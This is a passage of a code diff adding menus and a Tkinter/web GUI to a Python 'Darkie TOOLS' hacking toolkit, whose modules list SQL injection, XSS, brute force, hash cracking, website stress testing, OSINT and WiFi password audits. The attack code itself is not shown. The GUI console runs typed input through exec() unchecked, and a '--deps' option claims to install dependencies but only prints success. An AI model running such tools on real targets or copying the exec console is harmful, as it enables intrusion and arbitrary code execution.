+                ("Censys", lambda: self._run_module("OSINT", osint_censys)),
+                ("CT Log", lambda: self._run_module("OSINT", osint_ct_log)),
+                ("DNS History", lambda: self._run_module("OSINT", osint_dns_history)),
+                ("Wayback", lambda: self._run_module("OSINT", osint_wayback)),
+            ])
+            self._add_output(parent)
+
+        def _build_telephone(self, parent):
+            self._add_button_row(parent, [
+                ("Menu", lambda: self._run_module("Telephone", menu_telephone)),
+            ])
+            self._add_output(parent)
+
+        def _build_netutils(self, parent):
+            self._add_button_row(parent, [
+                ("Menu", lambda: self._run_module("Net Utils", menu_netutils)),
+                ("Ping", lambda: self._run_module("Net Utils", legacy_ping)),
+                ("Traceroute", lambda: self._run_module("Net Utils", legacy_traceroute)),
+                ("DNS Lookup", lambda: self._run_module("Net Utils", osint_dns)),
+                ("Whois", lambda: self._run_module("Net Utils", osint_whois)),
+            ])
+            self._add_output(parent)
+
+        def _build_hash_crypto(self, parent):
+            self._add_button_row(parent, [
+                ("Menu", lambda: self._run_module("Hash & Crypto", menu_hash_crypto)),
+            ])
+            self._add_output(parent)
+
+        def _build_audit(self, parent):
+            self._add_button_row(parent, [
+                ("Menu", lambda: self._run_module("Security Audit", menu_system_audit)),
+            ])
+            self._add_output(parent)
+
+        def _build_adv_network(self, parent):
+            self._add_button_row(parent, [
+                ("Menu", lambda: self._run_module("Adv Network", menu_adv_network)),
+            ])
+            self._add_output(parent)
+
+        def _build_adv_osint(self, parent):
+            self._add_button_row(parent, [
+                ("Recon Engine", lambda: self._run_module("Adv OSINT", osint_recon_engine)),
+                ("Censys Search", lambda: self._run_module("Adv OSINT", osint_censys_search)),
+            ])
+            self._add_output(parent)
+
+        def _build_wifi(self, parent):
+            self._add_button_row(parent, [
+                ("Menu", lambda: self._run_module("WiFi", menu_wifi)),
+                ("Password Audit", lambda: self._run_module("WiFi", wifi_password_audit)),
+            ])
+            self._add_output(parent)
+
+        def _build_reports(self, parent):
+            self._add_button_row(parent, [
+                ("Generate", lambda: self._run_module("Reports", menu_reports)),
+            ])
+            self._add_output(parent)
+
+        def log(self, msg, tag="info"):
+            if hasattr(self, "console_text"):
+                self.console_text.configure(state=tk.NORMAL)
+                self.console_text.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
+                self.console_text.see(tk.END)
+                self.console_text.configure(state=tk.DISABLED)
+
+        def _build_console(self, parent):
+            console_frame = ttk.Frame(parent)
+            console_frame.pack(fill=tk.BOTH, expand=True)
+            self.console_text = self._output_widget(console_frame)
+            self.console_text.configure(state=tk.DISABLED)
+            entry_frame = ttk.Frame(console_frame)
+            entry_frame.pack(fill=tk.X, padx=5, pady=3)
+            self.console_var = tk.StringVar()
+            entry = ttk.Entry(entry_frame, textvariable=self.console_var)
+            entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
+            entry.bind("<Return>", self._console_exec)
+            ttk.Button(entry_frame, text="Run", command=self._console_exec).pack(side=tk.RIGHT, padx=5)
+
+        def _console_exec(self, event=None):
+            cmd = self.console_var.get().strip()
+            if not cmd:
+                return
+            self.console_var.set("")
+            self.console_text.configure(state=tk.NORMAL)
+            self.console_text.insert(tk.END, f"> {cmd}\n")
+            self.console_text.configure(state=tk.DISABLED)
+
+            def run_cmd():
+                try:
+                    exec(cmd, globals())
+                except Exception as e:
+                    self.console_text.configure(state=tk.NORMAL)
+                    self.console_text.insert(tk.END, f"Error: {e}\n")
+                    self.console_text.see(tk.END)
+                    self.console_text.configure(state=tk.DISABLED)
+
+            _run_in_thread(run_cmd)
+
+    root = tk.Tk()
+    _DarkieGUI(root)
+    root.mainloop()
+
+
+def menu_gui():
+    """Beginner-friendly menu for the clickable interfaces."""
+    while True:
+        header_box("Graphical Interfaces", Fore.GREEN)
+        print(f"  {c('[1]', Fore.GREEN)}  Web Dashboard     {c_dim('opens in your browser (works everywhere)', Fore.CYAN)}")
+        print(f"  {c('[2]', Fore.CYAN)}  Desktop App       {c_dim('a clickable window on your computer (tkinter)', Fore.MAGENTA)}")
+        print(f"  {c('[b]', Fore.YELLOW)}  Back to main menu")
+        print()
+        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
+        if ch == "1":
+            try:
+                p = input(f"  {c(f'Port (default 5000) {SYM_PROMPT} ', Fore.CYAN)}").strip()
+                start_web_gui(port=int(p) if p.isdigit() else 5000)
+            except KeyboardInterrupt:
+                continue
+        elif ch == "2":
+            start_desktop_gui()
+        elif ch == "b":
             break
         else:
             print(f"  {RED}Invalid choice.{RESET}")
 
 
+# ──────────────────────────────────────────────────────────
+#  BEGINNER HELP
+# ──────────────────────────────────────────────────────────
+
+def _print_help():
+    print(f"\n  {c('How to use Darkie TOOLS:', Fore.CYAN)}")
+    print(f"  {c('1.', Fore.GREEN)}  Type a number and press Enter to open that module.")
+    print(f"  {c('2.', Fore.GREEN)}  Inside a module, pick an option the same way.")
+    print(f"  {c('3.', Fore.GREEN)}  Press 'b' to go back to the previous menu.")
+    print(f"  {c('4.', Fore.GREEN)}  Press 'q' to quit.")
+    print(f"  {c('5.', Fore.GREEN)}  Choose option 17 for a clickable graphical interface.")
+    print(f"\n  {Back.RED}{Fore.WHITE} IMPORTANT {Style.RESET_ALL}{Fore.YELLOW}  Only test systems you own or have permission to test.{Style.RESET_ALL}")
+    input(f"\n  {c('Press Enter to continue...', Fore.CYAN)}")
+
+
+# ──────────────────────────────────────────────────────────
+#  MAIN MENU
+# ──────────────────────────────────────────────────────────
+
+MAIN_MENU = [
+    ("1",  "Network & Threat Monitoring", "traffic capture, IDS, DDoS detection", Fore.RED),
+    ("2",  "Endpoint Security", "processes, files, network connections", Fore.MAGENTA),
+    ("3",  "Vulnerability Management", "scan targets and check for weaknesses", Fore.BLUE),
+    ("4",  "Data & Access Protection", "encryption, password strength checks", Fore.YELLOW),
+    ("5",  "Ethical Hacking & Pentest", "ports, SQL injection, XSS, brute force", Fore.GREEN),
+    ("6",  "SIEM & Log Analysis", "analyze logs and spot threat patterns", Fore.CYAN),
+    ("7",  "Stress Testing", "load tests for websites & Minecraft servers", Fore.RED),
+    ("8",  "OSINT Reconnaissance", "gather public info about a target", Fore.YELLOW),
+    ("9",  "Telephone Tools", "analyze and format phone numbers", Fore.MAGENTA),
+    ("10", "Network Utilities", "ping, traceroute, security headers", Fore.BLUE),
+    ("11", "Hash & Crypto Tools", "make hashes, crack hashes, generate passwords", Fore.CYAN),
+    ("12", "System Security Audit", "rootkits, SUID files, cron jobs, logs", Fore.RED),
+    ("13", "Advanced Network", "port knocking, firewall, advanced scans", Fore.BLUE),
+    ("14", "Advanced OSINT", "recon engine, Censys search", Fore.YELLOW),
+    ("15", "WiFi & Wireless", "audit your own wireless network", Fore.MAGENTA),
+    ("16", "Report Generator", "build a report of a previous scan", Fore.CYAN),
+    ("17", "Graphical Interfaces", "open the clickable Web or Desktop GUI", Fore.GREEN),
+]
+
+
+def main():
+    print_banner()
+    while True:
+        header_box("Darkie TOOLS v3 — Ultimate Cyber Toolkit", Fore.CYAN)
+        if sys.stdout.isatty():
+            print(f"  {dim(live_status_line())}")
+            print()
+        for num, name, desc, col in MAIN_MENU:
+            print(f"  {c(('['+num+']').ljust(4), col)} {name:<30} {c(desc, Fore.MAGENTA)}")
+        print()
+        print(f"  {c('[?]', Fore.YELLOW)}  Help   {c('[q]', Fore.RED)}  Quit")
+        print()
+
+        try:
+            choice = input(f"  {c(f'What would you like to do? {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
+            if choice == "?":
+                _print_help()
+            elif choice == "q":
+                print(f"\n  {c('Goodbye! Stay secure and ethical.', Fore.GREEN)}\n")
+                break
+            elif choice == "1": menu_network_threat()
+            elif choice == "2": menu_endpoint()
+            elif choice == "3": menu_vuln()
+            elif choice == "4": menu_data()
+            elif choice == "5": menu_pentest()
+            elif choice == "6": menu_siem()
+            elif choice == "7": menu_stress()
+            elif choice == "8": menu_osint()
+            elif choice == "9": menu_telephone()
+            elif choice == "10": menu_netutils()
+            elif choice == "11": menu_hash_crypto()
+            elif choice == "12": menu_system_audit()
+            elif choice == "13": menu_adv_network()
+            elif choice == "14": menu_adv_osint()
+            elif choice == "15": menu_wifi()
+            elif choice == "16": menu_reports()
+            elif choice == "17": menu_gui()
+            else:
+                print(f"  {RED}Invalid choice.{RESET}")
+        except KeyboardInterrupt:
+            print(f"\n  {c('Goodbye! Stay secure and ethical.', Fore.GREEN)}\n")
+            break
+        except Exception as e:
+            print(f"\n  {RED}{SYM_X} Module error: {e}{RESET}")
+            print(f"  {YELLOW}Returning to main menu.{RESET}")
+
+
 if __name__ == "__main__":
-    main()
+    import argparse
+    parser = argparse.ArgumentParser(
+        description="Darkie TOOLS v3 — Ultimate Cyber Toolkit (educational, own-account only)",
+        epilog="Examples:\n  python3 tool.py            start the interactive menu\n  python3 tool.py --web      open the Web Dashboard\n  python3 tool.py --web 8080  web dashboard on port 8080\n  python3 tool.py --gui     open the Desktop GUI",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    parser.add_argument("--web", nargs="?", const=5000, type=int, metavar="PORT",
+                        help="start the Web Dashboard in your browser (default port 5000)")
+    parser.add_argument("--gui", action="store_true", help="start the Desktop GUI (tkinter)")
+    parser.add_argument("--host", default="127.0.0.1", help="host to bind the Web Dashboard to (default 127.0.0.1)")
+    parser.add_argument("--deps", action="store_true",
+                        help="install missing dependencies automatically, then exit")
+    args = parser.parse_args()
+    if args.deps:
+        print(f"  {GREEN}{SYM_CHECK}  Dependencies ready.{RESET}")
+        sys.exit(0)
+    if args.web is not None:
+        start_web_gui(host=args.host, port=args.web)
+    elif args.gui:
+        start_desktop_gui()
+    else:
+        try:
+            main()
+        except KeyboardInterrupt:
+            print(f"\n\n  {c('Goodbye! Stay secure and ethical.', Fore.GREEN)}\n")
+            sys.exit(0)
